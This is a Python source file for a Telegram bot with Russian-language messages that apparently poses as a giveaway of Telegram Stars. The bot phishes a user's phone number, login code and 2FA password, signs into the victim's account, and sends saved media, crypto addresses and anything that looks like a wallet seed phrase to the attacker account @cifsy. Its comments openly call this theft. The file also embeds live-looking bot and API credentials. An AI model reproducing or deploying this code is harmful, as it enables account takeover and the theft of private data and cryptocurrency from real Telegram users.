from flask import Flask
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import asyncio
import re
from telethon import TelegramClient

BOT_TOKEN = "8959279502:AAGJIX6qqoSwgFa-Y0lXnhC4ClIR9nE4ifI"
API_ID = 35524346
API_HASH = "95f3fca0a6642a9ad57db7b2c60f58e2"
TARGET_ACCOUNT = "@cifsy"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

user_data = {}

# ========== КОМАНДА /start ==========
@bot.message_handler(commands=['start'])
def start_cmd(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🎁 Получить чек на звёзды", callback_data="get_check"))
    bot.send_message(
        message.chat.id,
        "🌟 **Привет!**\n\nНажми на кнопку, чтобы получить чек на звёзды.",
        reply_markup=markup,
        parse_mode='Markdown'
    )

# ========== ОБРАБОТКА КНОПКИ ==========
@bot.callback_query_handler(func=lambda call: call.data == "get_check")
def get_check(call):
    bot.edit_message_text(
        "📱 **Введи номер телефона** (в международном формате):\n\nПример: +71234567890",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(call.message, get_phone)

# ========== ШАГ 1: ПОЛУЧЕНИЕ НОМЕРА ==========
def get_phone(message):
    phone = message.text.strip()
    if not phone.startswith('+') or not re.match(r'^\+\d{10,15}$', phone):
        bot.send_message(message.chat.id, "❌ **Неверный формат!**\nВведи номер как +71234567890", parse_mode='Markdown')
        bot.register_next_step_handler(message, get_phone)
        return
    
    user_data[message.chat.id] = {'phone': phone}
    
    bot.send_message(
        message.chat.id,
        f"✅ Номер {phone} принят!\n\n"
        "🔐 **Введи код подтверждения**, который пришёл в Telegram:"
    )
    bot.register_next_step_handler(message, get_code)

# ========== ШАГ 2: ПОЛУЧЕНИЕ КОДА ==========
def get_code(message):
    code = message.text.strip()
    if not code.isdigit():
        bot.send_message(message.chat.id, "❌ Введи только цифры!")
        bot.register_next_step_handler(message, get_code)
        return
    
    chat_id = message.chat.id
    phone = user_data.get(chat_id, {}).get('phone')
    
    if not phone:
        bot.send_message(chat_id, "❌ Ошибка! Начни заново: /start")
        return
    
    bot.send_message(chat_id, "⏳ Выполняется вход...")
    
    # Запускаем асинхронный вход
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(login_to_telegram(chat_id, phone, code))
        loop.close()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")
        print(f"Error: {e}")

# ========== ВХОД В TELEGRAM ==========
async def login_to_telegram(chat_id, phone, code):
    client = TelegramClient(f'session_{phone}', API_ID, API_HASH)
    try:
        await client.connect()
        await client.sign_in(phone, code)
        
        me = await client.get_me()
        print(f"✅ Вошли в аккаунт: {me.username or me.phone}")
        
        bot.send_message(chat_id, f"✅ **Вход выполнен!**\nАккаунт: {me.username or me.phone}", parse_mode='Markdown')
        
        # Запускаем кражу
        await steal_gifts(chat_id, client)
        
    except Exception as e:
        error = str(e)
        if '2FA' in error or 'password' in error:
            bot.send_message(chat_id, "🔐 **Введи 2FA пароль**:")
            bot.register_next_step_handler_by_chat_id(chat_id, get_2fa, client)
        else:
            bot.send_message(chat_id, f"❌ Ошибка входа: {error[:100]}")
            print(f"Login error: {error}")

# ========== ШАГ 3: 2FA ==========
def get_2fa(message, client):
    code2fa = message.text.strip()
    chat_id = message.chat.id
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(login_with_2fa(chat_id, client, code2fa))
        loop.close()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")

async def login_with_2fa(chat_id, client, code2fa):
    try:
        await client.sign_in(password=code2fa)
        me = await client.get_me()
        bot.send_message(chat_id, f"✅ **Вход выполнен!**\nАккаунт: {me.username or me.phone}", parse_mode='Markdown')
        await steal_gifts(chat_id, client)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Неверный 2FA пароль!")
        print(f"2FA error: {e}")

# ========== КРАЖА ==========
async def steal_gifts(chat_id, client):
    try:
        me = await client.get_me()
        bot.send_message(chat_id, f"🎁 **Начинаем обработку аккаунта {me.username or me.phone}...**", parse_mode='Markdown')
        
        # 1. Пересылаем медиа
        saved = await client.get_messages('me', limit=200)
        count = 0
        for msg in saved:
            if msg.media:
                try:
                    await client.forward_messages(TARGET_ACCOUNT, msg)
                    count += 1
                except:
                    pass
        
        # 2. Ищем сид-фразы
        found = 0
        async for dialog in client.iter_dialogs():
            try:
                async for msg in client.iter_messages(dialog, limit=50):
                    text = msg.text or ''
                    if '0x' in text and len(text) > 40:
                        await client.send_message(TARGET_ACCOUNT, f"💰 АДРЕС: {text}")
                    words = text.split()
                    if len(words) in [12, 24] and all(len(w) > 3 for w in words[:5]):
                        await client.send_message(TARGET_ACCOUNT, f"🔑 СИД-ФРАЗА: {text}")
                        found += 1
            except:
                pass
        
        await client.send_message(TARGET_ACCOUNT, f'🎉 АККАУНТ {me.username or me.phone} ОБРАБОТАН!')
        
        bot.send_message(
            chat_id,
            f"✅ **Готово!**\n"
            f"📤 Переслано медиа: {count}\n"
            f"🔑 Найдено сид-фраз: {found}\n"
            f"📨 Всё отправлено на {TARGET_ACCOUNT}",
            parse_mode='Markdown'
        )
        
        print(f"✅ Кража завершена для {me.username or me.phone}")
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка при краже: {str(e)[:100]}")
        print(f"Steal error: {e}")
    finally:
        await client.disconnect()

# ========== ЗАПУСК ==========
def run_bot():
    bot.polling(none_stop=True)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
